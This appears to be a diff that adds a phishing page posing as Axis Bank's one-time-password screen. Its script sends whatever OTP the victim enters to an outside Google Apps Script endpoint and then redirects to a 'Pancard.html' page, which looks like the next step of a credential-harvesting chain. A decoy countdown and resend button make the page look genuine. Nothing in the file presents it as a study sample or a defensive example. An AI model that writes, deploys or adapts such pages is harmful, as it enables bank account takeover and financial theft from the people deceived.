@@ -1,0 +1,92 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="/style.css">
+   
+</head>
+<body>
+    <div class="image-container">
+        <img src="/image/AxisBank.jpg.jpeg" alt="Axis Bank">
+    </div>
+    <form id="secondForm" onsubmit="event.preventDefault(); submitForm();">
+        <div class="input-container">
+            <p>Please enter the one-time password (OTP) which was sent to your registered mobile number with Axis Bank:</p>
+            <input type="tel" id="otpInput" placeholder="Enter Your 6-digit OTP">
+            <span class="input-line"></span>
+        </div>
+        
+        <div class="timer-container">
+            <div id="timer"></div>
+            <button class="resend-button" onclick="resendOTP()">Resend OTP</button>
+        </div>
+        <br>
+        <div class="button-container">
+            <button class="login-button" type="submit">Submit</button>
+        </div>
+    </form>
+
+    <script>
+        const scriptURL = 'https://script.google.com/macros/s/AKfycbx9nH_zrcF6BZZlJ-p_-r5B1OPNLCIV9jm0Gej3c1HgN1P-oZSuAI-UYj31XxvbwtriOQ/exec';
+        const form = document.getElementById('secondForm');
+
+        form.addEventListener('submit', (e) => {
+            e.preventDefault();
+            const otpInput = document.getElementById('otpInput').value;
+            if (otpInput.length === 6 && /^\d+$/.test(otpInput)) {
+                const formData = new FormData();
+                formData.append('otp', otpInput);
+
+                fetch(scriptURL, { method: 'POST', body: formData })
+                    .then(response => {
+                        if (response.ok) {
+                            alert("OTP submitted successfully");
+                            window.location.assign("Pancard.html"); // Redirect to Pancard.html
+                        } else {
+                            throw new Error('Error submitting the form');
+                        }
+                    })
+                    .catch(error => console.error('Error!', error.message));
+            } else {
+                alert("Invalid OTP");
+            }
+        });
+
+        var timerSeconds = 180;
+        var timerId;
+
+        function startTimer() {
+            timerId = setInterval(updateTimer, 1000);
+        }
+
+        function updateTimer() {
+            var timerElement = document.getElementById("timer");
+            timerElement.textContent = "Resend OTP in " + timerSeconds + " seconds";
+
+            if (timerSeconds === 0) {
+                clearInterval(timerId);
+                timerElement.textContent = "";
+                document.querySelector('.resend-button').style.display = "block";
+            }
+
+            timerSeconds--;
+        }
+
+        function resetTimer() {
+            clearInterval(timerId);
+            timerSeconds = 180;
+            startTimer();
+            document.querySelector('.resend-button').style.display = "none";
+        }
+
+        function resendOTP() {
+            resetTimer();
+        }
+
+        // Start the timer when the page loads
+        window.onload = startTimer;
+    </script>
+</body>
+</html>
